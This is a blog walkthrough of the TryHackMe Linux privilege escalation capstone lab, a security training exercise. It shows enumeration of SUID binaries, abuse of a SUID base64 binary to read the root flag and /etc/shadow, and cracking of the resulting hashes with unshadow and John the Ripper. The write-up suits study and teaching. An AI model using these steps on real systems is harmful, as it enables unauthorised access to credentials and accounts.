---
title: "TryHackMe Linux Privesc Capstone: A Quick Internal Pentest to Gain Root"
datePublished: Wed Aug 16 2023 11:55:33 GMT+0000 (Coordinated Universal Time)
cuid: clldoeqdh000609miczqj50an
slug: linux-privesc-capstone
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1692185506075/efdf958c-8af9-4652-8fcb-5e17b68b4576.png
tags: hacking, ctf, penetration-testing, 2articles1week, ethicalhacking

---

This walkthrough will go over the [Linux Privilege Escalation Capstone](https://tryhackme.com/room/linprivesc) found on [TryHackMe](https://tryhackme.com/). The objective is to assess your understanding gained from the prior course content by placing you in an internal environment where you already possess low-level privileges on a Linux server. Your task is to identify an attack vector that enables you to escalate your privileges to root.

### Ready, set, go!

First, we want to check and see if there is a `cron job` that we can exploit.

```bash
cat /etc/crontab
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692185826744/eee4c211-6b03-4719-b6c2-265fd4e7ce7e.png align="center")

There's nothing for us here. Let's proceed to see which binaries are available for us to run with `sudo` privileges.

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692185884807/e3bcf798-ed39-4656-9de4-2114615d3156.png align="center")

We can exploit the `base64` binary with incorrect permissions to obtain the root flag.

```bash
LFILE=/home/rootflag/flag2.txt
base64 "$LFILE" | base64 --decode
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692186099250/bdf8c2f0-8489-4189-b365-156a44e465b3.jpeg align="center")

Well, that worked for obtaining the root flag! Acquiring flag1 was a bit more challenging and required the use of `unshadow`. This command merges the `passwd` and `shadow` files into a single file, which can then be utilized by `John-the-Ripper` to crack passwords.

```bash
LFILE=/etc/shadow
base64 "$LFILE" | base64 -- decode
```

Copy and save the content into a `shadow.txt` file.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692186390044/98ae8149-e977-40a5-9052-586d75b6bfe3.jpeg align="center")

Grab the contents from `passwd`.

```bash
cat /etc/passwd
```

Copy and save the content into a `passwd.txt` file.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692186452849/0d57e72e-5b5c-4686-93f5-af8cf005504a.png align="center")

Combine the files and use `John-the-Ripper` to crack the passwords:

```bash
unshadow passwd.txt shadow.txt > passwords.txt
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692186645883/49740bc6-7749-4c97-a428-0d480adac3ea.jpeg align="center")

Now that we have obtained `missy's` account password, we can switch users and retrieve the final flag from her `Documents` folder:

```bash
/home/missy/documents
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1692186822198/e7a92ac6-8f53-4cc3-914f-73304d6e6958.jpeg align="center")

### Summary

> In this walkthrough, we explore the Linux Privilege Escalation Capstone on TryHackMe, aiming to escalate our privileges to root. We begin by checking for exploitable cron jobs and identifying binaries with sudo privileges. We exploit the base64 binary to obtain the root flag and use unshadow and John-the-Ripper to crack passwords and retrieve the final flag from missy's Documents folder.